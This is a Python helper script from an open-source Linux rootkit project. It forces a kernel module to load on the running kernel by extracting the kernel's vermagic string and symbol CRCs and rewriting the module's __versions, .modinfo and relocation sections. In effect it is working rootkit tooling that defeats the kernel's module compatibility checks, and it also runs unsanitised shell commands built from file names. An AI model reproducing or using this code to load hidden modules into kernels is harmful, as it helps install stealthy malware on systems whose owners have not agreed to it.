#!/usr/bin/python
#    _  __  __     __
#   /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
#  / / / \ /      / \ (_) (_) (_ /  ) ( (_
#
## License
#
# Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
## Notes
#
# Patches a Linux Kernel Module, to accomplish the requesites to be loaded
# in the current Kernel, without looking into compatibility issues.
#
# Patches the vermagic variable, (re)generates the __versions section if need,
# and patches the .rela.gnu.linkonce.this_module section from the kobject.
#

import struct
import sys
import platform
import re
import os
import subprocess
rela = __import__("find-rela")

def match_vermagics(data, ref):
	# search vermagics
	pattern = "(" + re.escape(ref) + " " + ".*?\x00)"
	pattern = pattern.encode()
	#print "Reference is release: " + ref
	#print "Searching by regex hex pattern: " + pattern
	regex = re.compile(pattern)
	vermagics = []
	for match in regex.findall(data):
		length = len(match)
		remaining = (8 - (length % 8))
		pattern = "(" + re.escape(match.decode()) + "\x00" * remaining + "(?:(?:\x00{0})|(?:\x00{8})|(?:\x00{16})|(?:\x00{24})))(?!\x00)"
		pattern = pattern.encode()
		#print "\"" + match + "\""
		#print length
		#print remaining
		#print pattern
		#print pattern.encode('hex')
		regex = re.compile(pattern)
		for vermagic in regex.findall(data):
			#print "Match!"
			#print match_obj.encode('hex')
			#print len(match_obj)
			#print "Found vermagic: \"" + match + "\""
			vermagic = vermagic.decode().replace("\x00", "")
			vermagic = "vermagic=" + vermagic
			vermagic = vermagic + "\x00" * (8 - (len(vermagic) % 8))
			vermagic = vermagic.encode()
			vermagics.append(vermagic)
	return vermagics

def extract_vmlinuz(vmlinuz, vmlinux):
	# decompress vmlinuz image
	cmd = "./extract-vmlinux " + vmlinuz + " > " + vmlinux + " 2>/dev/null"
	#print cmd
	os.system(cmd)
	#sys.exit(0)

def extract_vermagic(vmlinux):
	# load vmlinux binary
	f = open(vmlinux, 'rb')
	data = f.read()
	f.close()

	vermagics = match_vermagics(data, ref)
	return vermagics

def search_vmlinuzes(ref):
	paths = []
	for root, subdirs, files in os.walk("/boot"):
		for _file in files:
			path = root + "/" + _file
			info = subprocess.check_output(["file", path])
			if "bzImage".encode() in info and ref.encode() in info:
				print ("Found possible vmlinuz " + path)
				paths.append(path)
	return paths

def extract_sections(vmlinux, sections):
	sectfiles = []
	for section in sections:
		sectfile = vmlinux + "." + section
		print ("Extracting section " + section + " of " + vmlinux + " in " + sectfile + " ...")
		cmd = "objcopy --dump-section " + section + "=" + sectfile + " " + vmlinux
		os.system(cmd)
		sectfiles.append(sectfile)
	return sectfile

def extract_symbols(module, symfile):
	print ("Extracting imported symbols of " + module + " into " + symfile + " ...")
	cmd = "readelf -s --wide " + module + " | grep UND | grep GLOBAL | awk '{ print $8}' > " + symfile
	os.system(cmd)
	with open(symfile) as f:
		symbols = f.readlines()
	# you may also want to remove whitespace characters like `\n` at the end of each line
	symbols = [line.strip() for line in symbols]
	symbols.reverse()
	symbols = ["module_layout"] + symbols
	print (str(len(symbols)) + " symbols imported (added module_layout): ")
	#print (symbols)
	return symbols 

def generate_versions(vmlinux, symbols, versecfile):
	print ("Building structure in memory from Kernel sections ...")
	# get address of __ksymtab_strings in Kernel image
	data = subprocess.check_output(["readelf", "-t", vmlinux])
	pattern = b"__ksymtab_strings\n[ \S]*?([0-9a-f]{16}?) "
	regex = re.compile(pattern)
	for addr in regex.findall(data):
		print ("Address of __ksymtab_strings is " + addr.decode('utf-8'))
		addr = int(addr, 16)
		#print (addr)
	# build structures to access symbol_names => CRCs
	f2 = open(vmlinux + "." + "__ksymtab_strings", 'rb')
	# build ksymtab
	f = open(vmlinux + "." + "__ksymtab", 'rb')
	data = f.read()
	f.close()
	# ffffffff81db95b0
	pattern = b"[\0-\xff]{8}([\0-\xff]{8})"
	regex = re.compile(pattern)
	ksymtab = []
	for ksym in regex.findall(data):
		#print (ksym)
		#ksym = ksym[::-1]
		#print (ksym)
		off = struct.unpack("=Q", ksym)
		#print(off)
		off = off[0]
		#off = int(ksym.decode().encode('hex'), 16)
		#print (off)
		off = off - addr
		#print (off)
		f2.seek(off, os.SEEK_SET)
		ksym = b""
		while True:
			byte = f2.read(1)
			if byte == b"":
				print ("Sorry, end of file reached.")
				sys.exit(-1)
			elif byte == b"\0":
				break
			ksym = ksym + byte
		#print ksym
		#print (ksym)
		ksymtab.append(ksym)
	print (str(len(ksymtab)) + " exported symbols from __ksymtab ...")
	# build ksymtab_gpl
	f = open(vmlinux + "." + "__ksymtab_gpl", 'rb')
	data = f.read()
	f.close()
	# ffffffff81db95b0
	pattern = b"[\0-\xff]{8}([\0-\xff]{8})"
	regex = re.compile(pattern)
	ksymtab_gpl = []
	for ksym in regex.findall(data):
		#ksym = ksym[::-1]
		#print ksym.encode('hex')
		#off = int(ksym.encode('hex'), 16)
		off = struct.unpack("=Q", ksym)
		off = off[0]
		#print off
		off = off - addr
		#print off
		f2.seek(off, os.SEEK_SET)
		ksym = b""
		while True:
			byte = f2.read(1)
			if byte == b"":
				print ("Sorry, end of file reached.")
				sys.exit(-1)
			elif byte == b"\0":
				break
			ksym = ksym + byte
		#print ksym
		ksymtab_gpl.append(ksym)
	print (str(len(ksymtab_gpl)) + " exported GPL symbols from __ksymtab_gpl ...")
	f2.close()
	# build	kcrctab
	f = open(vmlinux + "." + "__kcrctab", 'rb')
	data = f.read()
	f.close()
	pattern = b"([\0-\xff]{8})"
	regex = re.compile(pattern)
	kcrctab = []
	for crc in regex.findall(data):
		kcrctab.append(crc)
	print (str(len(kcrctab)) + " CRCs found in __kcrctab ...")
	# build kcrctab_gpl
	f = open(vmlinux + "." + "__kcrctab_gpl", "rb")
	data = f.read()
	f.close()
	pattern = b"([\0-\xff]{8})"
	regex = re.compile(pattern)
	kcrctab_gpl = []
	for crc in regex.findall(data):
		kcrctab_gpl.append(crc)
	print (str(len(kcrctab_gpl)) + " GPL CRCs found in __kcrctab_gpl ...")
	print (str(len(kcrctab) + len(kcrctab_gpl)) + " total CRCs found in Kernel Image ...")
	print ("Generating __versions section in " + versecfile + " ...")
	versec = b""
	for symbol in symbols:
		#print "Searching CRC for symbol: " + symbol + " ..."
		success = False
		symbol = symbol.encode()
		for i, ksym in enumerate(ksymtab):
			#print (ksym)
			#print (symbol)
			if ksym == symbol:
				#print "Found CRC " + crcs[i] + " for symbol " + symbol + " ..."
				verentry = kcrctab[i] + ksym
				verentry = verentry + b"\x00" * (0x40 - len(verentry))
				versec = versec + verentry
				success = True
				break
		if success:
			continue
		for i, ksym in enumerate(ksymtab_gpl):
			if ksym == symbol:
				#print "Found CRC " + crcs[i] + " for symbol " + symbol + " ..."
				verentry = kcrctab_gpl[i] + ksym
				verentry = verentry + b"\x00" * (0x40 - len(verentry))
				versec = versec + verentry
				success = True
				break
		if not success:
			print ("Sorry, can't find CRC for symbol: " + symbol.decode('utf-8'))
			sys.exit(-1)
	print ("Section __version is " + str(len(versec)) + " bytes of length ...")
	f = open(versecfile, "wb")
	f.write(versec)
	f.close()
	print (versecfile + " section file generated ...")

def update_section(module, versecfile):
	cmd = "objcopy --update-section __versions=" + versecfile + " --set-section-flags __versions=alloc,readonly " + module + " 2>/dev/null"
	if os.system(cmd):
		cmd = "objcopy --add-section __versions=" + versecfile + " --set-section-flags __versions=alloc,readonly --section-alignment 32 " + module
		if os.system(cmd):
			print ("Sorry, error when adding __versions section.")
			sys.exit(-1)
		else:
			print ("Added section __versions in " + module)
	else:
		print ("Updated section __versions in " + module)

def update_modinfo(module, vermagic):
	sectfile = module + ".modinfo"

	# dump .modinfo of LKM
	os.system("objcopy --dump-section .modinfo=" + sectfile + " " + module)
	#os.system("cp %s %s.2" %(sectfile, sectfile))
	# load dumped section file
	f = open(sectfile, 'rb')
	data = f.read()
	f.close()

	# remove sectfile
	os.remove(sectfile)

	# replace vermagic
	pattern = b"(vermagic=[\S\s]*?[\x00]+)"
	regex = re.compile(pattern)
	match = regex.findall(data)
	match = match[0]
	print ("Replacing:")
	print ([match])
	print ("by:")
	print ([vermagic])

	old_vermagic = match

	data = data.replace(old_vermagic, vermagic)

	# save sectfile
	f = open(sectfile, 'wb')
	f.write(data)
	f.close()

	# patch LKM
	#if os.system("readelf -t --wide " + module + " | grep \".old.modinfo\""):
	#	os.system("objcopy --rename-section .modinfo=.old.modinfo " + module)
	#os.system("objcopy --remove-section .modinfo " + module)
	#os.system("objcopy --add-section .modinfo=" + sectfile + " --set-section-flags .modinfo=alloc,readonly --section-alignment 8 " + module)
	os.system("objcopy --update-section .modinfo=" + sectfile + " --set-section-flags .modinfo=alloc,readonly " + module)

	# remove sectfile
	os.remove(sectfile)

def patch_rela(vmlinux, module):
	print ("Patching .rela.gnu.linkonce.this_module ...")
	init, exit = rela.find_rela_offsets(vmlinux)
	print ("init = %d\nexit = %d" % (init, exit))
	cmd = "./rela-patch -p %d %d %s" % (init, exit, module)
	#print (cmd)
	if os.system(cmd):
		return -1
	#print ("Resizing .gnu.linkonce.this_module ...")
	#secfile = "%s.gnu.linkonce.this_module" % module
	#cmd = "objcopy --dump-section .gnu.linkonce.this_module=%s %s" % (secfile, module)
	#if os.system(cmd):
	#	return -1
	#zero = secfile + ".zero"
	#cmd = "dd if=/dev/zero of=%s bs=1 count=200" % zero
	#if os.system(cmd):
	#	os.remove(secfile)
	#	return -1
	#cmd = "cat %s >> %s" % (zero, secfile)
	#if os.system(cmd):
	#	os.remove(secfile)
	#	os.remove(zero)
	#	return -1
	#cmd = "objcopy --update-section .gnu.linkonce.this_module=%s %s" % (secfile, module)
	#if os.system(cmd):
	#	os.remove(zero)
	#	os.remove(secfile)
	#	return -1

	#os.remove(secfile)
	#os.remove(zero)

	return 0

## Main
if len(sys.argv) < 2:
	print ("use: " + sys.argv[0] + " <module>")
	sys.exit(-1)

module = sys.argv[1]
ref = platform.release()
ret = 0
vmlinuzes = search_vmlinuzes(ref)
for vmlinuz in vmlinuzes:
	vmlinux = "vmlinux-" + ref
	ret = extract_vmlinuz(vmlinuz, vmlinux)
	vermagics = extract_vermagic(vmlinux)
	print ("Possible vermagic values for " + vmlinuz + " found:")
	print (vermagics)
	for vermagic in vermagics:
		if b"modversions" in vermagic:
			print ("Kernel " + vmlinuz + " uses modversions ...")
			sections = ["__ksymtab_strings", "__ksymtab", "__ksymtab_gpl", "__kcrctab", "__kcrctab_gpl"]
			secfiles = extract_sections(vmlinux, sections)
			symfile = module + ".symbols"
			symbols = extract_symbols(module, symfile)
			versecfile = vmlinux + ".__versions"
			generate_versions(vmlinux, symbols, versecfile)
			update_section(module, versecfile)
			for section in sections:
				os.remove(vmlinux + "." + section)
			os.remove(versecfile)
			os.remove(symfile)
		update_modinfo(module, vermagic)

	# patch .rela.gnu.linkonce.this_module
	ret = patch_rela(vmlinux, module)

	os.remove(vmlinux)

print ("Done!")
